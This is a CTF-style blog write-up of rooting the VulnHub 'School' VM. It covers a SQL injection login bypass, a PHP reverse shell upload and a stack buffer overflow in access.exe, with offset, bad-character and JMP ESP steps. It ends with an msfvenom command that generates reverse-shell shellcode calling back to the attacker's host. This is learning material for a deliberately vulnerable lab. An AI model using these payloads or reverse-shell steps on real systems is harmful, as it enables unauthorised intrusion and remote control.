---
layout: post
title:  "School - VulnHub"
---
You’ll find this vm here :  `https://www.vulnhub.com/entry/school-1,613/`


#### Port Scan

- Nmap found three open ports: `22`, `23` and `80`
- For now let's focus on port `80`

![image]( /assets/img/school/1.PNG)

#### Login | SQL injection

- The login page is vulnerable to `sql injection`

{% highlight text %}
  Username : admin' or '1'='1'-- -
  Password : blahblah
{% endhighlight %}

![image]( /assets/img/school/2.PNG)

- We are logged in as admin

![image]( /assets/img/school/3.PNG)

#### Reverse Shell

- `view-source:http://10.0.2.110/student_attendance/index.php?page=home`

![image]( /assets/img/school/4.PNG)

- There is in comments the `index.php?page=site_settings`
- Let's check it

![image]( /assets/img/school/5.PNG)

- This form allows to upload a file
- We will try to upload the Reverse Shell

![image]( /assets/img/school/6.PNG)

![image]( /assets/img/school/7.PNG)

- After success uploading of the reverse shell
- open your listener and reload the `http://10.0.2.110/student_attendance/index.php?page=site_settings`

![image]( /assets/img/school/8.PNG)

#### Finding processes

- Running the `ps aux` to find possible processes for root

{% highlight sh %}
  www-data@school:/$ ps aux | grep root<br>
  ps aux | grep root
  ...
  ...
  root 1027  0.0  0.5 2631244 6056 ?  S 14:48   0:00 /opt/access/access.exe
{% endhighlight %}

- The `access.exe` is a windows application and running as root

![image]( /assets/img/school/9.PNG)

- Also the `access.exe` is the application that is running on port `23`

![image]( /assets/img/school/10.PNG)

- Download the `access.exe` and the `funcs_access.dll`

#### The way to Root

There is a possibility that the `access.exe` is vulnerable to `Stack-based BOF`. I will set up my environment to exploit the access.exe file.
In my `Windows 10` vm i installed the `Eclipse + PyDev` and the `Immunity Debugger`

## Theory

#### What is BOF (Buffer Overflow)

Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to another. A buffer overflow (or buffer overrun) occurs when the volume of data exceeds the storage capacity of the memory buffer. As a result, the program attempting to write the data to the buffer overwrites adjacent memory locations.
For example, a buffer for log-in credentials may be designed to expect username and password inputs of 8 bytes, so if a transaction involves an input of 10 bytes (that is, 2 bytes more than expected), the program may write the excess data past the buffer boundary.
Buffer overflows can affect all types of software. They typically result from malformed inputs or failure to allocate enough space for the buffer. If the transaction overwrites executable code, it can cause the program to behave unpredictably and generate incorrect results, memory access errors, or crashes.

#### What is Buffer Overflow Attack

Attackers exploit buffer overflow issues by overwriting the memory of an application. This changes the execution path of the program, triggering a response that damages files or exposes private information. For example, an attacker may introduce extra code, sending new instructions to the application to gain access to IT systems. If attackers know the memory layout of a program, they can intentionally feed input that the buffer cannot store, and overwrite areas that hold executable code, replacing it with their own code. For example, an attacker can overwrite a pointer (an object that points to another area in memory) and point it to an exploit payload, to gain control over the program.

#### Structure of the stack

![image]( /assets/img/school/11.PNG)

- `Extended Stack Pointer (ESP)`

ESP denotes the address where the next data has to be entered into the stack and holds the top of the stack. This is the point where the instructions which use the stack (PUSH, POP, CALL and RET).

- `Buffer Space`

A stack buffer is a type of buffer or temporary location created within a computer’s memory for storing and retrieving data from the stack. It enables the storage of data elements within the stack, which can later be accessed programmatically by the program’s stack function or any other function calling that stack. Any information placed into the buffer space should never travel outside of the buffer space itself.

- `Extended Base Pointer (EBP)`

EBP denotes the address of the location where the first data has to be entered into the stack.

- `Extended Instruction Pointer (EIP) / Return Address`

EIP denotes the address of next instruction has to be executed into the stack.

#### Visual example

Ιn the image below we can see the sequence of A's did not escape the buffer space. Therefore there is no buffer overflow vulnerability.

![image]( /assets/img/school/buffer1.png)


Ιn the second image below we can see the sequence of A's have escaped the buffer space and have reached the EIP. Therefore there a buffer overflow vulnerability. Gaining control of the EIP is very dangerous because, the attacker can use the pointer to point to malicious code and spawn a reverse shell.

![image]( /assets/img/school/buffer2.png)

#### Fuzzing

The first step in buffer overflow is `fuzzing`. Fuzzing allows us to send bytes of data to the access.exe repeatedly with a constant increase in the size of the data being sent. This will help us, to overflow the buffer space and overwriting the EIP.

- `One second before running the script`

![image]( /assets/img/school/12.PNG)

- `After running the script`

![image]( /assets/img/school/13.PNG)

Okay, the system crashed at 2000 bytes, as we saw in the image before we can overwrite the EIP ``(41414141 = AAAA)``.
The overwrite is between 1 and 2000 bytes. I will use the `msf-pattern_create` and `msf-pattern_offset` tools to find the exact size at which the EIP was overwritten.


- `msf-pattern_create`

After sending the generated string, i will check the value of the EIP.
So, if we give to msf-pattern_offset the length of the generated string and the value of the EIP it will calculate the exact length of the point that the EIP was overwritted. Αs I understood the msf-pattern_offset checks at which point of the string the ASCII value of the EIP was found and calculates the size of the bytes from the beginning to the point of the EIP value.

#### Offset

Creating the pattern with 2000 bytes length

{% highlight sh %}
 msf-pattern_create -l 2000 -s ABCDEFGHIKL,alienum,123456789
{% endhighlight %}

![image]( /assets/img/school/14.PNG)

- Sending the pattern

![image]( /assets/img/school/15.PNG)

- Calculating the exact length

![image]( /assets/img/school/16.PNG)

- The exact match was found at `1902` bytes.

#### Confirm the EIP control

![image]( /assets/img/school/17.PNG)

The value of the EIP successfully overwritted with four B's = 42424242, so EIP control confirmed

#### Badchars

Some characters can cause issues in the development of exploits. I will send at once every hex value of ASCII characters to the access.exe to see if any character cause issues.

![image]( /assets/img/school/18.PNG)

The letter M = `\x4d` (hex) is a bad char so let's remove it from our `badchars` variable and rerun the script **We will repeat that proccess until bad chars not found.**

- I will run it one more time for example

![image]( /assets/img/school/19.PNG)

The second bad char was the letter O = `\x4f` (hex). We will remove it from our `badchars` variable and we will rerun the script.

- All bad chars that i found was : `\x4d` `\x4f` `\x5f` `\x79` `\x7e` `\x7f`

#### Find the JMP ES

As i read, we don't need to give to the <span style="color:powderblue;">EIP</span> the exact address of our malicious shellcode.
       The instruction <span style="color:powderblue;">JMP ESP</span> will jump to the stack pointer and execute our malicious shellcode.
       So, If we can find the JMP ESP instruction in the program, we can give its memory address to the EIP and it will jump to automatically to our malicious shellcode.

![image]( /assets/img/school/20.PNG)

#### Finding the address of the JMP ESP

- Immunity Debugger -> View -> Executable modules, Select the funcs_access.dll

Remember we downloaded from the school machine the access.exe and the funcs_access.dll<br>
      Their location was under /opt/access/

![image]( /assets/img/school/21.PNG)

- Search for -> All commands

![image]( /assets/img/school/22.PNG)

- Type : JMP ESP

![image]( /assets/img/school/23.PNG)

- We found 2 addresses, let's use one of them

address 1 : 625012D0<br>
address 2 : 625012DD

![image]( /assets/img/school/24.PNG)

Remember the system understand the addresses using little endian. <br>
So, the `\xD0\x12\x50\x62` stands for `625012D0`

#### Testing the return address

We will modify the script to check if the EIP call successfully the address of the `Instruction JMP ESP`

- Toggle `Breakpoint` to the `JMP ESP` address

![image]( /assets/img/school/25.PNG)

- Run the script

![image]( /assets/img/school/26.PNG)

We triggered the breakpoint. Therefore, the EIP call successfully the address of the Instruction JMP ESP.

#### Creating the reverse shell

In our kali, generate the shellcode


{% highlight sh %}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.106 LPORT=4444 -f python -a x86 -b '\x00\x4d\x4f\x5f\x79\x7e\x7f'
{% endhighlight %}


- The null byte char \x00 by default is a bad char so we add it to our badchars list (-b)

![image]( /assets/img/school/27.PNG)

- Now we will add the shellcode into our script

![image]( /assets/img/school/28.PNG)

#### Rooted

![image]( /assets/img/school/29.PNG)
